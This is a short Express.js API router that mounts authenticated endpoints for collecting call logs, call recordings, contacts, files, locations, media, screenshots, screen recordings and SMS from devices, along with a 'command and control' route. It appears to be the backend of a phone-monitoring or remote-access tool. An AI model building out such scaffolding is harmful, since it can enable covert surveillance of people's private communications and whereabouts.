// In routes/api/v1/index.js
const express = require('express');
const router = express.Router();
const { authenticate, authorize } = require('../../../middleware/auth');

// Health check
router.get('/health', (req, res) => res.json({ status: 'ok', timestamp: new Date().toISOString() }));

// Auth routes
router.use('/auth', require('./auth'));

// All routes below require authentication
router.use(authenticate);

// Device management
router.use('/devices', require('./devices'));

// Data collection endpoints
router.use('/call-logs', require('./callLogs'));
router.use('/call-recordings', require('./callRecordings'));
router.use('/contacts', require('./contacts'));
router.use('/files', require('./files'));
router.use('/locations', require('./locations'));
router.use('/media', require('./media'));
router.use('/screenshots', require('./screenshots'));
router.use('/screen-recordings', require('./screenRecordings'));
router.use('/sms', require('./SMS'));  // Note: Consider renaming to sms.js for consistency

// Command and control
router.use('/commands', require('./commands'));

// Settings and configuration
router.use('/settings', require('./settings'));

module.exports = router;
